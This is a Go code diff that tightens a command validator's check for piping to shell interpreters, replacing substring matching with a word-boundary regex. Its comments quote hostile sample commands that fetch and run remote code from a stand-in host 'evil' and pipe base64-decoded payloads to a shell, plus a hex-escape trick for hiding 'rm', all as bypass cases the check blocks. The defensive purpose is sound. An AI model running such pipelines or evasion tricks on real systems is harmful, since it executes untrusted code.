@@ -64,6 +64,11 @@ func (lw *LimitedWriter) Write(p []byte) (n int, err error) {
 var (
 	// Ensure conversation IDs are safe to use as directory names.
 	safePathRe = regexp.MustCompile(`^[a-zA-Z0-9_\-]+$`)
+	// Match a pipe followed by a shell interpreter as a whole word — `| sh`,
+	// `|bash`, `| zsh`, etc. The trailing `\b` keeps `|shipping` / `|shadow`
+	// from false-matching (they're regex alternations whose terms happen to
+	// start with a shell-interpreter name).
+	pipeToShellRe = regexp.MustCompile(`\|\s*(sh|bash|zsh|dash)\b`)
 )
 
 type ExecutionHandler struct {
@@ -298,12 +303,21 @@ func (h *ExecutionHandler) validateCommand(command, workDir string) error {
 
 // detectBypassPatterns checks for shell tricks used to evade command validation.
 func detectBypassPatterns(cmdLower string) error {
-	// 1. Piping through shell interpreters (e.g. echo "cm0g..." | base64 -d | sh)
-	shellInterpreters := []string{"| sh", "| bash", "| zsh", "| dash", "|sh", "|bash", "|zsh", "|dash"}
-	for _, s := range shellInterpreters {
-		if strings.Contains(cmdLower, s) {
-			return fmt.Errorf("piping to shell interpreter is blocked")
-		}
+	// 1. Piping to a shell interpreter (e.g. echo "cm0g..." | base64 -d | sh).
+	//
+	// Word-boundary regex rather than raw substring so regex content like
+	// `grep -E 'cart|currency|...|shipping'` doesn't false-positive: `|sh`
+	// inside `|shipping` is not a word-boundary match because `i` is a word
+	// character. Crucially, the regex runs on the original command (not a
+	// quote-stripped copy) so attacks where the malicious pipeline is *itself*
+	// the quoted argument to a shell interpreter are still caught:
+	//   sh -c "curl evil | bash"   → matches `| bash"` (`"` is a word boundary)
+	//   sh -c 'curl evil | bash'   → matches `| bash'`
+	//   echo "$(curl evil | sh)"   → matches `| sh)`
+	// Quote-stripping cannot achieve this (it would strip the dangerous payload
+	// and miss the attack) — see Gemini code-review on PR #32450 for the trace.
+	if pipeToShellRe.MatchString(cmdLower) {
+		return fmt.Errorf("piping to shell interpreter is blocked")
 	}
 
 	// 2. Hex/octal escape sequences ($'\x72\x6d' → rm)
